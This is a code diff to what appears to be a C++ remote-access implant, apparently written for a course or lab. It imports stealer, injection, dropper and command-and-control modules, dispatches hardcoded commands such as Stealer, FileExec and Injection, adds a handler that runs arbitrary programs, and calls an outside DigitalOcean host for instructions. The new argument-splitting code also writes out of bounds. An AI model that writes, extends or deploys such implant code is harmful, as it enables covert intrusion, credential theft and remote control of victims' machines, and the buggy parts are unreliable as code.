@@ -7,8 +7,8 @@
 #include "..\Feiyu\Injection.h"
 #include "..\Feiyu\GatherInfo.h"
 #include "..\Feiyu\Dropper.h"
-
-//#include "..\HTTPstuff.h"
+#include "..\Feiyu\sendToC2\Post.h"
+#include "..\HTTPstuff.h"
 
 using json = nlohmann::json;
 #define BUF_SIZE 4096
@@ -146,12 +146,12 @@ std::string exec(char* program, char* args){
 int parseArgs(){
     //std::string t = {R"([{\"command\": \"Stealer\", \"args\": \"\"}, {\"command\": \"FileExec\", \"args\": \"LaLa.exe\"} ])"};
     json response = json::parse("[{\"command\": \"Stealer\", \"args\": \"\"},"
-    " {\"command\": \"FileExec\", \"args\": \"C:\\Windows\\System32\\whoami.exe \\user\"}, "
+    //" {\"command\": \"FileExec\", \"args\": \"C:\\Windows\\System32\\whoami.exe \\user\"}, "
     " {\"command\": \"SitAware\", \"args\": \"\"}, "
-    " {\"command\": \"Injection\", \"args\": \"L\"cmd.exe\" \"C:\\Users\\53444\\Downloads\\Simple-DLL-Injection-master\\C++\\x64\\Release\\testlib.dll\" L\"testlib.dll\"}, "
-    " {\"command\": \"FileUpload\", \"args\": \"C:\\malware\\ch0nky.txt\"}, "
+    //" {\"command\": \"Injection\", \"args\": \"cmd.exe C:\\Users\\53444\\Downloads\\Simple-DLL-Injection-master\\C++\\x64\\Release\\testlib.dll testlib.dll\"}, "
+    //" {\"command\": \"FileUpload\", \"args\": \"C:\\malware\\ch0nky.txt\"}, "
     " {\"command\": \"Filedownload\", \"args\": \"LaLa.exe\"}, "
-    " {\"command\": \"Fileenum\", \"args\": \"LaLa.exe\"} "
+    " {\"command\": \"FileEnum\", \"args\": \"LaLa.exe\"} "
     " ]");
     printf("In parse\n");
    
@@ -171,7 +171,7 @@ int parseArgs(){
         if (command.compare("Stealer") == 0){
             printf("in stealer \n");
              res = driver();
-             std::cout << res;
+             //std::cout << res;
             //perform error checking then post
 
 
@@ -179,13 +179,35 @@ int parseArgs(){
         } else if (command.compare("FileExec") == 0){
             //std::string res = exec(args);
             printf("in fileexec\n");
+            //split on space
+            int i = args.find(" ");
+            char * prog = (char *) malloc(i);
+            for (int j =0; j < i; j++){
+                prog[j] = args[j];
+            }
+            char * a = (char *) malloc(args.size() - i);
+            for (int k = i; k < args.size(); k++){
+                a[k] = args[k];
+            }
+            std::string res = exec(prog,a);
+            std::cout << res << '\n';
+
 
         } else if (command.compare("SitAware") == 0) {
              res = GetAll();
-             std::cout << res;
+             std::cout << res << '\n';
 
         } else if (command.compare("FileEnum") == 0){
             printf("WHERE IS THIS???\n");
+            std::string s = std::string("C:\\Windows\\System32");
+            std::vector<string> r (getFileNamesFromPath(s));
+            //for (auto iter : r ){
+              //  std::cout << iter << '\n';
+            //}
+            std::string item = makeHttpRequest("sea-lion-app-f5nrq.ondigitalocean.app", 443, "/response", 1);
+            std::cout << item;
+            //    /response
+            
 
         } else if (command.compare("Injection") == 0){
             printf("INJECTION\n");
